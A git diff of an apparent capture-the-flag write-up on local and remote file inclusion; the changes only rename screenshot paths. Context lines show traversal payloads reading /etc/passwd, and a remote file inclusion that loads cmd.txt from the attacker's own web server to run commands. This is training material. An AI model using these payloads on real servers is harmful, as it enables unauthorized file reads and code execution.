@@ -18,7 +18,7 @@ Input field didn't work but we were able to bypass by entering our command in th
 
 **URL:** hxxp://10.10.230.14/lab3.php?file=..//..//../../../etc/passwd%00&#x20;
 
-<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (22) (4).png" alt=""><figcaption></figcaption></figure>
 
 **Which function is causing the directory traversal in Lab #4?**
 
@@ -46,7 +46,7 @@ hxxp://10.10.230.14/lab6.php?file=THM-profile//..//..//..//..//etc//os-release%0
 
 ****
 
-<figure><img src="../../.gitbook/assets/image (12) (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -56,7 +56,7 @@ hxxp://10.10.230.14/lab6.php?file=THM-profile//..//..//..//..//etc//os-release%0
 
 <figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Capture Flag2 at /etc/flag2**
 
@@ -78,7 +78,7 @@ What it would look like in burp.
 
 Page is getting rid of our slashes
 
-<figure><img src="../../.gitbook/assets/image (11) (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 Changing to post and added extra slashed and null character at end.
 
@@ -92,7 +92,7 @@ Changing to post and added extra slashed and null character at end.
 
 Created the following file to run the hostname command.
 
-****![](<../../.gitbook/assets/image (14).png>)****
+****![](<../../.gitbook/assets/image (14) (6).png>)****
 
 **Kali**
 
@@ -108,4 +108,4 @@ python2 -m SimpleHTTPServer 81
 hxxp://10.10.230.14/playground.php?file=http://10.10.11.193:81/cmd.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>
